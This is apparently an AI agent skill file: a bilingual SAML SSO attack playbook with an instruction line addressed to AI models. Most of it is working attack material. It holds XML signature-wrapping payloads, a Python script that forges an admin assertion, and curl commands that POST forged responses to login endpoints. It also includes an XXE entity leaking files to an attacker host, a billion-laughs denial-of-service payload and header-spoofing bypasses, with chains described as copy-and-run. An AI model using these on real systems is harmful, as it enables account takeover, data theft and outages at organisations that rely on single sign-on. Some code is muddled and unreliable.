---
name: saml-sso-assertion-attacks
description: >-
  SAML SSO assertion attack playbook. Use when testing signature validation, XML signature wrapping, assertion attribute tampering, audience and recipient checks, ACS handling, replay and freshness, account-mapping trust, and XML parser weaknesses in enterprise SSO.
---

# SKILL: SAML SSO and Assertion Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Enterprise SAML SSO attack surface. Covers signature coverage flaws (unsigned assertions, wrong signed node), XML Signature Wrapping XSW1-XSW8 with concrete payloads, assertion attribute tampering (NameID/email/role), Audience/Recipient/Destination bypass, replay via missing InResponseTo, account-mapping trust (email-only, case folding, NameID format confusion), and XML parsing weaknesses (XXE, comment injection that bypasses signatures). Pair with xxe-xml-external-entity for parser depth and oauth-oidc-misconfiguration for non-SAML federation.

## 0. RELATED ROUTING

Use this skill when the target federates identity over SAML. Also load:

- [xxe xml external entity](../xxe-xml-external-entity/SKILL.md) for XML parser exploitation depth (XXE, XInclude, XSLT, billion laughs) that this file references but does not fully expand.
- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) when the same target also offers OAuth/OIDC federation, or for the analogous redirect_uri/state/nonce checks.
- [authbypass authentication flaws](../authbypass-authentication-flaws/SKILL.md) for the local login / 2FA / session boundary that SSO feeds into.
- [jwt oauth token attacks](../jwt-oauth-token-attacks/SKILL.md) when the IdP also mints OIDC/JWT tokens alongside SAML.

---

## 1. SAML PROTOCOL LANDSCAPE

SAML 2.0 Web Browser SSO has three actors. Misconfigurations are binding- and signature-location-specific.

| Actor | Role | What to attack |
|---|---|---|
| IdP (Identity Provider) | authenticates user, issues assertions | issuer trust, signing key, attribute claims |
| SP (Service Provider) | consumes assertion, grants session | ACS validation, signature verification, attribute mapping |
| Browser | relay | SAMLRequest/SAMLResponse interception, replay |

| Binding | How the XML travels | Attack surface |
|---|---|---|
| HTTP-Redirect | base64+deflate in URL query (`SAMLRequest=`/`SAMLResponse=`) | URL tampering, log leakage, deflate quirks |
| HTTP-POST | base64 in form POST body to ACS | body tampering, signature wrapping |
| HTTP-Artifact | opaque artifact resolved via back-channel | artifact replay, back-channel confusion |
| SAML SOAP | assertion directly to attribute authority | SOAP injection |

A SAML **Response** wraps one or more **Assertions**. Either the Response, the Assertion, or both can be signed. The signed-node location is the most common defect.

```xml
<samlp:Response xmlns:samlp="..." ID="_r1" Version="2.0" Destination="https://sp.target.com/acs">
  <saml:Issuer>https://idp.target.com</saml:Issuer>
  <ds:Signature xmlns:ds="...">...</ds:Signature>            <!-- Response-level signature -->
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion xmlns:saml="..." ID="_a1" Version="2.0">
    <saml:Issuer>https://idp.target.com</saml:Issuer>
    <ds:Signature>...</ds:Signature>                          <!-- Assertion-level signature -->
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">victim@target.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2026-07-23T12:00:00Z" Recipient="https://sp.target.com/acs" InResponseTo="_req1"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-07-23T11:00:00Z" NotOnOrAfter="2026-07-23T12:00:00Z">
      <saml:AudienceRestriction><saml:Audience>https://sp.target.com</saml:Audience></saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2026-07-23T11:30:00Z" SessionIndex="_a1">
      <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```
Decode/deflate helpers (HTTP-Redirect is base64-deflate):
```bash
echo "SAMLRequest_VALUE" | base64 -d | zlib-flate -uncompress      # read
cat edited.xml | zlib-flate -compress | base64 -w0                 # re-encode
```

---

## 2. SIGNATURE COVERAGE FLAWS

The most frequent SAML bug: the SP verifies *a* signature, but not over the *node it trusts*.

| Defect | What happens | Test |
|---|---|---|
| Unsigned assertion accepted | SP never checks signature | delete `<ds:Signature>` entirely |
| Response signed, Assertion not | SP verifies Response sig, reads unsigned Assertion | move/clone malicious Assertion (XSW) |
| Wrong signed node | SP signs Issuer, reads Subject | re-order so signed node is benign |
| Verified with wrong key | SP trusts any cert in keystore / any IdP | swap Issuer to a second trusted IdP |
| Signature stripping | remove `<ds:Signature>` and `ID` ref still passes | strip signature, replay unsigned |
| `WantAssertionsSigned` false | SP config allows unsigned assertions | submit Response-signed-only response |

Strip the entire `<ds:Signature>` block and resubmit the base64'd response. If the SP logs the user in, signature verification is absent or non-fatal.

---

## 3. XML SIGNATURE WRAPPING (XSW)

XSW exploits the gap between "the signature is valid" and "the parser reads the signed node". The signature references the original Assertion by `ID`. We add a second, malicious Assertion elsewhere; the validator confirms the signed node is intact, but the app's DOM parser reads the malicious node first.

| Variant | Where malicious Assertion is placed |
|---|---|
| XSW1 | evil sibling **before** the signed Assertion (same parent) |
| XSW2 | evil sibling **after** the signed Assertion |
| XSW3 | evil Assertion **as first child of Response**, signed Assertion moved deeper |
| XSW4 | evil Assertion wraps the signed Assertion |
| XSW5 | evil Assertion as child of the signed Assertion |
| XSW6 | evil Assertion appended under `<saml:Issuer>` of Response |
| XSW7 | evil Assertion under `<samlp:Status>` |
| XSW8 | evil Assertion as sibling via namespace confusion / duplicate root |

XSW1 — evil sibling first (canonical example):
```xml
<samlp:Response xmlns:samlp="..." ID="_r1" Version="2.0">
  <saml:Issuer>https://idp.target.com</saml:Issuer>
  <ds:Signature xmlns:ds="...">  <!-- signs _a1, still valid -->
    <ds:SignedInfo><ds:Reference URI="#_a1">...</ds:Reference></ds:SignedInfo>
  </ds:Signature>

  <!-- EVIL ASSERTION (read first by getElementsByTagName / firstChild) -->
  <saml:Assertion ID="_evil" Version="2.0">
    <saml:Issuer>https://idp.target.com</saml:Issuer>
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"/></saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>superadmin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>

  <!-- ORIGINAL SIGNED ASSERTION (validator checks this one) -->
  <saml:Assertion ID="_a1" Version="2.0">
    ...original victim content + valid signature...
  </saml:Assertion>
</samlp:Response>
```
The validator finds `#_a1` and verifies it. The app does `response.getAssertions()` (returns **both** in document order) or `.getFirstChild()` and uses `_evil`. Result: logged in as `admin@target.com` with `superadmin`.

XSW4 — evil wrapper around signed node:
```xml
<saml:Assertion ID="_evil">     <!-- app reads this outer one -->
  <saml:Assertion ID="_a1">     <!-- validator verifies this inner one -->
    ...original signed content...
    <ds:Signature>...</ds:Signature>
  </saml:Assertion>
</saml:Assertion>
```

Tools: **SAML Raider** (Burp extension) auto-generates XSW1-8 from a captured response and re-signs if you have the IdP key; **SAMLExtractor** pulls SAMLRequest/SAMLResponse from HTTP history; **saml-hammer / SAML-Inspector** for hand-crafted variants. Always test all eight — Java/`OpenSAML`, .NET/`ComponentSpace`, Python/`python3-saml` each fail on different XSWs.

---

## 4. ASSERTION ATTRIBUTE TAMPERING

When the signature is absent, stripped, or only covers a benign node, tamper the attributes that drive authorization.

```xml
<saml:AttributeStatement>
  <saml:Attribute Name="email"><saml:AttributeValue>admin@target.com</saml:AttributeValue></saml:Attribute>
  <saml:Attribute Name="role"><saml:AttributeValue>superadmin</saml:AttributeValue></saml:Attribute>
  <saml:Attribute Name="groups"><saml:AttributeValue>Domain Admins</saml:AttributeValue></saml:Attribute>
  <saml:Attribute Name="mfa"><saml:AttributeValue>true</saml:AttributeValue></saml:Attribute>
</saml:AttributeStatement>
```

| Claim the app may key on | Tamper to |
|---|---|
| `NameID` | victim's username / `admin` |
| `email` | victim's email (pre-account takeover) |
| `role` / `groups` | `admin`, `Domain Admins`, `sudoers` |
| `mfa` / `authnContextClassRef` | `true` / `MFA` to skip 2FA at SP |
| `eduPersonAffiliation` | `staff`, `employee` (federation abuse) |

Also tamper conditions/bearers (Section 5) and `SessionIndex` (replay, Section 7).

---

## 5. AUDIENCE, RECIPIENT, DESTINATION BYPASS

These three restrict where an assertion may be consumed. Weak checks enable **cross-SP assertion reuse**.

| Element | Restricts | Bypass |
|---|---|---|
| `Audience` (in `AudienceRestriction`) | which SP may consume | set to attacker SP / wildcard / missing |
| `Recipient` (in `SubjectConfirmationData`) | ACS URL the assertion is delivered to | set to attacker ACS / missing |
| `Destination` (on Response) | intended ACS URL | mismatch accepted |
| `InResponseTo` (in `SubjectConfirmationData`) | which request this answers | remove for IdP-initiated replay (Section 7) |

Cross-SP reuse chain: capture a valid signed assertion issued for SP-A (you control an account on SP-A); submit the same assertion to SP-B's ACS; if SP-B doesn't check `Audience=SP-B` / `Recipient=SP-B-ACS`, it consumes it and maps the NameID/attributes per SP-B's rules. Test each independently: drop `AudienceRestriction`, set `Audience=https://sp.target.com.evil.com` (suffix), set `Recipient` to a different path on the same host, set `Destination` to mismatch.

---

## 6. ISSUER TRUST AND IDP-INITIATED SSO

| Defect | Test |
|---|---|
| Any trusted IdP accepted | swap `<saml:Issuer>` to a second IdP the SP trusts |
| Issuer not checked | set `Issuer=https://evil-idp.com` |
| Multi-tenant issuer confusion | change tenant in issuer URL (`.../tenantA` vs `.../tenantB`) |
| IdP-initiated SSO unguarded | POST a self-built Response to ACS with no `SAMLRequest` context |
| Signature from wrong IdP accepted | re-sign with any key in the SP trust store |

IdP-initiated SSO abuse: the SP accepts IdP-initiated logins (no `InResponseTo` required); attacker captures a valid signed assertion for their own account and replays it against the SP ACS repeatedly (or forges a fresh unsigned one if signatures aren't checked). Because there is no request state, the SP cannot detect replay via `InResponseTo`.

---

## 7. REPLAY AND FRESHNESS

| Defect | Test |
|---|---|
| Missing `InResponseTo` | submit Response with `InResponseTo` removed |
| `InResponseTo` not validated | reuse a Response with a stale/foreign `InResponseTo` |
| `NotBefore`/`NotOnOrAfter` not checked | submit an expired or future-dated assertion |
| Time window too wide | mint assertion, replay 12h later |
| `SessionIndex` not tracked | reuse same `SessionIndex` across logins |
| Assertion replay | capture once, replay many times |
| IdP-initiated stateless | no per-request tracking -> unlimited replay |

Replay probe: log in normally, capture the SAMLResponse at the ACS; log out; re-POST the exact same SAMLResponse to the ACS; if logged back in -> replay not prevented (no `InResponseTo` tracking / no one-time assertion ID cache). Skew window abuse: if the SP allows e.g. ±8h clock skew, a captured assertion is replayable for hours even with `NotOnOrAfter` enforced. Extend `NotOnOrAfter` forward if unsigned/tamperable.

---

## 8. ACCOUNT MAPPING TRUST

The SP maps a SAML identity to a local account. Defects mirror OAuth account binding but with SAML-specific twists.

Email-only binding: SP matches local account purely on `<saml:NameID Format="...emailAddress">` or email attribute. Attacker registers `victim@target.com` at a trusted IdP (or self-asserts if signing is broken) -> logs in -> bound to victim's local account.

Case folding:
```
Admin@corp.com  vs  admin@corp.com      (role/lookup keyed on email, case differs)
ADMIN@target.com vs admin@target.com     (lookup lowercases, role check preserves)
```
Register `Admin@target.com` at the IdP; if the SP role mapping matches on the raw email while account lookup lowercases, you may collide with an admin account.

NameID format confusion:

| Format URI | Meaning | Confusion |
|---|---|---|
| `...nameid-format:emailAddress` | email | matched against username field |
| `...nameid-format:persistent` | opaque, stable per SP | treated as globally unique |
| `...nameid-format:transient` | single-use, random | cached/reused |
| `...nameid-format:unspecified` | freeform | parsed as username |
| `...nameid-format:X509SubjectName` | DN | substring matched |

If the SP accepts multiple NameID formats and maps them inconsistently, an attacker can switch format (`transient` -> `emailAddress`) to collide with a victim account, or use `unspecified` with a raw `admin` value.

Unverified attributes: `role`, `groups`, `eduPersonScopedAffiliation`, `isMemberOf` are trusted for authorization. If the IdP doesn't actually assert them (or signs nothing), the SP's blind trust yields privilege escalation. Federation aggregators (InCommon, eduGAIN) amplify this: a compromised/rogue IdP in the federation can mint assertions for any user at any member SP.

---

## 9. XML PARSING WEAKNESSES IN SAML

SAML is XML; the same parser flaws apply. Most production SPs disable external entities, but verify each one.

XXE / XInclude in SAMLRequest (the SP parses the inbound request you control):
```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:AuthnRequest [
  <!ENTITY % xxe SYSTEM "http://test-attacker.com/?leak=%file;">
  %xxe;
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ...>
  ...
</samlp:AuthnRequest>
```
Or XInclude to read `/etc/passwd` into the parsed doc. See [xxe xml external entity](../xxe-xml-external-entity/SKILL.md) for full payload sets (OOB exfil, parameter entities, billion laughs, UTF-7/UTF-16 bypasses).

CDATA and namespace confusion:
```xml
<saml:AttributeValue><![CDATA[admin]]></saml:AttributeValue>
<!-- some parsers strip CDATA, some compare raw; mismatches change equality checks -->

<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
  <!-- two prefixes, same URI; a parser comparing by prefix instead of namespace URI can be tricked -->
</saml:Assertion>
```
XSLT transform abuse: if the SP applies an `<ds:XPath>` or XSLT transform during signature processing, attacker-supplied transforms can trigger file read or SSRF. Test transform-injection in `ds:Transforms`.

---

## 10. COMMENT INJECTION THAT BYPASSES SIGNATURES

A subtle, high-impact class: XML signatures canonicalize (C14N) and may **strip comments**, but the application's DOM parser keeps them. Inserting comments inside signed content keeps the signature valid (C14N-without-comments restores the original text) while the parsed value changes.

Comment splitting a value — original signed:
```xml
<saml:NameID>admin@target.com</saml:NameID>
```
Inject a comment (signature still valid under C14N-without-comments because the comment is removed, restoring the original text; the app reads the *commented* DOM):
```xml
<saml:NameID>admin@target.com<!-- -->.evil.com</saml:NameID>
```
Depending on parser, the app sees `admin@target.com` + `.evil.com` concatenated, or only the first text node. Test both to find a parser that yields a value you control while the signature canonicalizes back to the victim's value.

Comment between attribute and value:
```xml
<saml:Attribute Name="role"><!-- comment --><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
```
Some canonicalizers drop the comment, the validator passes, but the app's XPath `//Attribute[@Name='role']/AttributeValue` may select a different node when the comment shifts node positions. Insert comments to move where `getElementsByTagName` lands, combining with XSW. C14N-without-comments is the default for many SAML stacks, which is exactly why comment injection survives signature verification.

> Defense side note (for findings): enforcing `InclusiveNamespaces`, exact-match on the signed `ID` after C14N-with-comments, and selecting assertions by signed `ID` (not by document order) closes most XSW and comment-injection gaps.

---

## 11. ACCOUNT-TAKEOVER CHAIN VIA XSW (END-TO-END)

Putting Sections 3-8 together — a common real-world chain:
```
1. Capture a normal SP-initiated SAMLResponse for YOUR account (logged in legitimately).
2. In SAML Raider / editor, apply XSW1: add an EVIL assertion before the signed one.
   EVIL assertion:
     <saml:NameID Format="...emailAddress">cto@target.com</saml:NameID>
     <saml:Attribute Name="role"><saml:AttributeValue>superadmin</saml:AttributeValue></saml:Attribute>
3. Leave the original signed assertion intact (signature still verifies against #_a1).
4. (Optional) also widen Conditions NotOnOrAfter for replay headroom.
5. POST the modified SAMLResponse to https://sp.target.com/acs.
6. SP:
   - verifies signature over _a1 -> OK
   - reads first Assertion (the EVIL one) -> binds local session to cto@target.com / superadmin
7. You are now the CTO.
```
If signature verification is absent entirely (Section 2), skip the XSW complexity and just edit the single assertion in place.

---

## 12. TESTING CHECKLIST

```
□ Capture one full SP-initiated round trip (AuthnRequest + Response at ACS)
□ Identify binding (Redirect/POST/Artifact); note deflate step for Redirect
□ Determine which node(s) are signed: Response only, Assertion only, both, none
□ Strip <ds:Signature> entirely -> still accepted? (signature absent/non-fatal)
□ Check WantAssertionsSigned / Response-signed-only config gap
□ XSW: apply XSW1-XSW8 (SAML Raider); confirm which variant the SP library parses
□ Tamper NameID/email/role/groups/mfa attributes when signature bypassed
□ Audience: drop AudienceRestriction, set suffix/wildcard Audience
□ Recipient/Destination: set mismatched ACS URLs, cross-SP reuse
□ Issuer: swap to another trusted IdP, multi-tenant tenant-swap
□ IdP-initiated SSO: POST self-built Response with no InResponseTo
□ Replay: re-POST captured Response after logout; check InResponseTo tracking
□ Time: tamper NotBefore/NotOnOrAfter, test skew window, extend forward if unsigned
□ SessionIndex: reuse across logins
□ Account mapping: email-only binding, case folding (Admin@ vs admin@)
□ NameID format: switch persistent/transient/emailAddress/unspecified to collide accounts
□ Unverified attributes: role/groups/eduPersonAffiliation trusted for authz
□ XML parsing: XXE/XInclude in SAMLRequest, CDATA, namespace prefix confusion, XSLT transform
□ Comment injection: split signed NameID/AttributeValue with <!-- -->; verify C14N-without-comments survival
□ Cross-link to xxe-xml-external-entity for full parser payload sets
□ Cross-link to oauth-oidc-misconfiguration for non-SAML federation on the same target
```

---

## 13. 2026 EMERGING TECHNIQUES

### 13.1 CVE-2026-41103 — Entra ID SSO 认证绕过（CVSS 9.1）

**2026年5月Microsoft安全更新头条漏洞。** 影响Atlassian Jira和Confluence的Microsoft SSO插件。

**根因：** SSO插件响应处理逻辑中的**认证算法实现错误**。未经认证的攻击者可发送特制SSO响应消息，欺骗插件接受**伪造身份**，**直接绕过MFA**——应用认为认证已通过Entra ID成功完成（含所有MFA步骤）。

| 属性 | 值 |
|---|---|
| CVE | CVE-2026-41103 |
| CVSS | 9.1 |
| 影响产品 | Atlassian Jira/Confluence Microsoft SSO Plugin |
| 攻击前提 | 无需用户交互、无需先前权限 |
| Microsoft评级 | Exploitation More Likely |
| 修复 | 2026年5月安全更新 |

**攻击模式：**
```
1. 攻击者获取目标SSO插件的ACS端点URL
2. 构造特制SAML Response，包含伪造的身份属性
3. 直接POST到ACS端点（绕过IdP）
4. SSO插件因认证算法实现错误，接受伪造响应
5. 攻击者以任意身份登录（包括管理员）
6. MFA完全被绕过——插件认为MFA已在IdP完成
```

**关键教训：** "最后一英里"认证——IdP与终端应用之间的连接——是最薄弱环节。保护IdP本身不够，集成点必须以同等严格程度审计。

### 13.2 CVE-2026-12281 — Shibboleth WordPress 插件认证绕过（CVSS 8.1）

**2026年6月24日公开披露。** 影响Shibboleth WordPress插件 < 2.5.4 所有版本。

**根因：** HTTP头身份模式中的**failure-open设计缺陷**（CWE-287）。当未配置反欺骗密钥（anti-spoofing key）时，插件**无条件信任**包含身份头的任何HTTP请求。

| 属性 | 值 |
|---|---|
| CVE | CVE-2026-12281 |
| CVSS | 8.1 |
| 影响产品 | Shibboleth WordPress Plugin < 2.5.4 |
| CWE | CWE-287 (Authentication Bypass) |
| 公开日期 | 2026-06-24 |
| PoC计划公开 | 2026-07-28 |
| 发现者 | Khaled Alenazi (Nxploited) |

**利用需四个非默认条件同时满足：**

```
1. HTTP头属性模式已启用（非默认）
2. 反欺骗密钥为空（非默认）
3. 自动账户创建已启用（非默认）
4. 部署不在网络边界清除不可信客户端头
```

**PoC思路（条件满足时）：**
```bash
# 当四个条件同时满足时，直接发送HTTP头伪造身份
curl -H "X-Remote-User: administrator" \
     -H "X-Shib-Identity-Provider: https://idp.target.edu/idp/shibboleth" \
     -H "X-Shib-eppn: admin@target.edu" \
     https://wp.target.edu/wp-login.php
# 插件无条件信任HTTP头 → 以admin身份登录
```

### 13.3 CVE-2026-42354 — Sentry SAML SSO 绕过

影响 Sentry 21.12.0 至 26.4.1 之前版本。

**根因：** 用户通过SAML IdP认证时，Sentry基于assertion中的邮箱关联内部账户，但**未正确验证邮箱归属**。攻击者可在自己控制的IdP中配置与目标账户相同的邮箱，冒充已有账户。

**攻击流程：**
```
1. 攻击者在自建IdP中注册，配置邮箱为 victim@target.com
2. 通过自建IdP发起SAML SSO登录
3. Sentry收到SAML Response，提取邮箱 victim@target.com
4. Sentry未验证该邮箱是否属于攻击者 → 关联到受害者账户
5. 攻击者以受害者身份登录Sentry
```

### 13.4 Shibboleth IdP XML 解析器 DoS（2026-05-13 安全公告）

**漏洞类型：** 恶意构造XML导致过度资源消耗（内存/CPU耗尽拒绝服务）。

| 属性 | 值 |
|---|---|
| 影响组件 | Shibboleth Identity Provider + OpenSAML |
| 修复版本 | IdP V5.2.2 |
| 攻击前提 | **无需认证**（XML消息在签名验证前被解析） |
| 致谢 | Jens Friess & Haya Schulmann (法兰克福歌德大学) |

**关键点：** 大多数XML消息类型在签名保护之前或之前被解析，**无需认证攻击者**即可利用。

**修复措施：**
- 新增限制解析内容的属性
- SAML Metadata使用独立于通用/消息场景的解析器设置（更宽松，可独立控制）
- 新增控制SAML/SOAP消息大小限制的属性（默认未启用）

**遗留问题：** 直接消费eduGAIN MDS聚合的部署者，默认属性限制可能过低；提高到50以上可能使IdP仍易受DoS攻击。

**PoC思路：**
```xml
<!-- Billion Laughs 变种 — 在签名验证前触发 -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... 更多嵌套 ... -->
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AttributeStatement>
      <saml:Attribute Name="x">
        <saml:AttributeValue>&lol3;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

### 13.5 云SSO配置陷阱（Entra ID / Okta）

**IdP发起SSO的RelayState CSRF：**

Entra ID支持SP发起和IdP发起的SAML流程。**IdP发起流程更常被错误配置**。

| 陷阱模式 | 风险 | 影响 |
|---|---|---|
| IdP发起SSO + 无RelayState验证 | CSRF类攻击 | 攻击者可向受害者会话投递有效SAML assertion |
| SP未验证Audience | 跨SP断言重用 | A应用的断言可用于B应用 |
| 属性映射过度信任 | 权限提升 | IdP提供的role/group直接用于授权 |
| 邮箱绑定无验证 | 账户接管 | CVE-2026-42354模式 |

**Entra IdP发起SSO攻击链：**
```
1. 攻击者登录自己的IdP账户
2. IdP生成针对目标SP的SAML Response
3. 攻击者将此Response URL发送给受害者（通过钓鱼/CSRF）
4. 受害者浏览器已有IdP会话 → 自动跳转到SP ACS
5. SP接受SAML Response（IdP发起，无InResponseTo验证）
6. 如果属性映射过度信任 → 攻击者控制的属性注入受害者会话
```

### 13.6 2026 SAML 测试清单补充

```
□ 测试SSO插件的"最后一英里"认证（CVE-2026-41103模式）
□ 检查Shibboleth插件反欺骗密钥是否为空（CVE-2026-12281模式）
□ 测试邮箱绑定账户映射是否验证归属（CVE-2026-42354模式）
□ 发送Billion Laughs变种测试签名验证前DoS
□ 测试IdP发起SSO的RelayState CSRF
□ 检查Audience Restriction是否跨SP隔离
□ 验证属性映射是否过度信任role/group
□ 测试自建IdP冒充（配置受害者邮箱）
□ 检查SAML/SOAP消息大小限制是否启用
□ 验证XML解析器是否在签名验证前限制资源消耗
□ 测试Shibboleth IdP V5.2.2以下版本的XML DoS
□ 检查WordPress Shibboleth插件版本是否>=2.5.4
```

### 13.7 2026 SAML CVE 速查表

| CVE | 产品 | CVSS | 漏洞类型 | 日期 |
|---|---|---|---|---|
| CVE-2026-41103 | Atlassian Jira/Confluence MS SSO Plugin | 9.1 | 认证算法实现错误→MFA绕过 | 2026-05 |
| CVE-2026-12281 | Shibboleth WordPress Plugin <2.5.4 | 8.1 | HTTP头failure-open认证绕过 | 2026-06 |
| CVE-2026-42354 | Sentry 21.12.0-26.4.1 | — | SAML邮箱绑定无验证→账户冒充 | 2026 H1 |
| — | Shibboleth IdP <V5.2.2 | — | XML解析器DoS（签名验证前） | 2026-05-13 |

**参考来源：**
- Microsoft May 2026 Security Update (CVE-2026-41103)
- Wiz Vulnerability Database (CVE-2026-12281)
- Shibboleth Security Advisory 2026-05-13
- Sentry Security Advisory (CVE-2026-42354)

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 2026 年实战中高频出现的 4 条完整 SAML 攻击链,包含可直接运行的 curl/python/bash 命令、分步利用、检测绕过技巧与真实 CVE 引用。所有代码注释为中文,即拷即用。

### 攻击链 1: SAML Response 伪造(XML 签名包装 XSW)

**目标画像**: SP 使用 OpenSAML/ComponentSpace 库,签名覆盖 Response 但读取未签名的 Assertion。
**CVE 参考**: CVE-2026-41103(Atlassian Jira/Confluence MS SSO 插件签名覆盖缺陷,可直接伪造身份绕过 MFA)。

**步骤 1 - 捕获合法 SAML Response**:
```bash
# 以攻击者自身账户正常登录, 在 Burp Suite 中拦截 ACS POST 请求
# 提取 SAMLResponse 参数(base64 编码)
echo "PHNhbWxwOlJlc3BvbnNl..." | base64 -d > /tmp/saml_response.xml

# 查看原始 Response 结构, 确认签名覆盖的节点
cat /tmp/saml_response.xml | xmllint --format -
# 关键: 确认 <ds:Signature> 是在 Response 层还是 Assertion 层
# 若仅 Response 层签名 -> Assertion 未签名 -> 可用 XSW1 注入恶意 Assertion
```

**步骤 2 - 应用 XSW1 注入恶意 Assertion**:
```python
#!/usr/bin/env python3
# 文件名: saml_xsw1.py
# XSW1: 在已签名 Assertion 之前插入恶意 Assertion(同父级)
import base64, zlib
from lxml import etree

# 读取捕获的合法 SAML Response
with open('/tmp/saml_response.xml', 'rb') as f:
    tree = etree.parse(f)
root = tree.getroot()

# 构造恶意 Assertion(伪造为管理员)
ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}
evil_assertion = etree.SubElement(root, '{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
evil_assertion.set('ID', '_evil')
evil_assertion.set('Version', '2.0')

issuer = etree.SubElement(evil_assertion, '{urn:oasis:names:tc:SAML:2.0:assertion}Issuer')
issuer.text = 'https://idp.target.com'  # 伪造为合法 IdP issuer

subject = etree.SubElement(evil_assertion, '{urn:oasis:names:tc:SAML:2.0:assertion}Subject')
nameid = etree.SubElement(subject, '{urn:oasis:names:tc:SAML:2.0:assertion}NameID')
nameid.set('Format', 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress')
nameid.text = 'admin@target.com'  # 伪造为管理员邮箱
sc = etree.SubElement(subject, '{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmation')
sc.set('Method', 'urn:oasis:names:tc:SAML:2.0:cm:bearer')

attr_stmt = etree.SubElement(evil_assertion, '{urn:oasis:names:tc:SAML:2.0:assertion}AttributeStatement')
attr = etree.SubElement(attr_stmt, '{urn:oasis:names:tc:SAML:2.0:assertion}Attribute')
attr.set('Name', 'role')
av = etree.SubElement(attr, '{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue')
av.text = 'superadmin'  # 伪造管理员角色

# 将恶意 Assertion 插入到已签名 Assertion 之前(关键: 文档顺序在前)
root.insert(list(root).index(evil_assertion), evil_assertion)
# 实际上 lxml 的 SubElement 默认追加到末尾, 需用 insert 放到签名 Assertion 之前
signed_assertion = root.xpath('//saml:Assertion[@ID="_a1"]', namespaces=ns)[0]
root.remove(evil_assertion)
idx = list(root).index(signed_assertion)
root.insert(idx, evil_assertion)  # 恶意 Assertion 在前, 签名 Assertion 在后

# 编码为 base64 用于 POST
xml_bytes = etree.tostring(root, xml_declaration=True, encoding='UTF-8')
encoded = base64.b64encode(xml_bytes).decode()
print(f'[+] XSW1 构造完成, 恶意 SAMLResponse(base64):')
print(encoded)
```

**步骤 3 - 提交伪造 SAML Response 到 ACS**:
```bash
# 将构造好的 SAMLResponse POST 到目标 ACS 端点
SAML_B64="<上面输出的 base64 字符串>"
curl -sk -X POST "https://sp.target.com/saml/acs" \
  -d "SAMLResponse=${SAML_B64}" \
  -d "RelayState=" \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -o /tmp/response.html -w "HTTP %{http_code}\n"

# 检查是否登录成功(返回 302 跳转 + Set-Cookie)
grep -i "Set-Cookie\|Location" /tmp/response.html
# 若返回管理员 session cookie -> XSW1 成功
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 若 XSW1 失败, 尝试 XSW4(恶意 Assertion 包裹签名 Assertion)
# 结构: <Assertion ID="_evil"><Assertion ID="_a1">...已签名...</Assertion></Assertion>
# 应用读取外层 _evil, 验证器验证内层 _a1

# 绕过 2: 注释注入保持签名有效(C14N-without-comments 去除注释, 但 DOM 保留)
# <saml:NameID>admin@target.com<!-- -->.evil.com</saml:NameID>
# 签名校验通过(注释被 C14N 去除), 但应用读取拼接后的值

# 绕过 3: 若签名完全缺失, 直接编辑 Assertion 属性(role/email/groups)
# 删除 <ds:Signature> 整块后重放, 若 SP 未强制要求签名 -> 登录成功
```

**防御要点**: SP 必须验证 Assertion 级签名(非仅 Response 级);按签名引用的 `ID` 选取 Assertion(非文档顺序);强制 `WantAssertionsSigned=true`。

---

### 攻击链 2: SAML X.509 证书混淆

**目标画像**: SP 信任多个 IdP 的证书,或信任 keystore 中任意证书;多租户 SSO 中 tenant 切换导致证书混淆。
**CVE 参考**: CVE-2026-42354(Sentry SAML 邮箱绑定无验证,可冒充任意用户)。

**步骤 1 - 识别 SP 信任的多个 IdP**:
```bash
# 查看 SP 的 SAML 元数据, 确认信任的 IdP 列表
curl -s https://sp.target.com/saml/metadata | xmllint --format - | grep -i "EntityDescriptor\|X509Certificate"

# 若 SP 信任多个 IdP(包括攻击者可控的自建 IdP) -> 可用自建 IdP 签发任意身份
# 关键: SP 不校验 <saml:Issuer> 是否与签名证书来源 IdP 一致
```

